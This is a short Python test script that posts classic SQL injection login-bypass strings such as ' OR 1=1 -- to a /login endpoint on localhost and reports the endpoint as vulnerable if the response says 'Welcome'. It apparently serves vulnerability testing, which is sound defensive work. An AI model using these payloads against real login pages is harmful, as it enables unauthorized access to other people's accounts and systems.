import requests

BASE_URL = "http://127.0.0.1:5000"


def test_sql_injection_login():

    url = f"{BASE_URL}/login"

    payloads = [
        "' OR 1=1 -- ",
        "' OR '1'='1",
        "' OR 'a'='a",
        "' OR 1=1#"
    ]

    results = []

    for payload in payloads:

        data = {
            "username": payload,
            "password": "anything"
        }

        response = requests.post(url, json=data)

        success = "Welcome" in response.text

        results.append({
            "payload": payload,
            "response": response.text,
            "vulnerable": success
        })

        if success:
            return {
                "vulnerability": "SQL Injection",
                "endpoint": "/login",
                "payload": payload,
                "status": "VULNERABLE"
            }

    return {
        "vulnerability": "SQL Injection",
        "endpoint": "/login",
        "status": "NOT DETECTED"
    }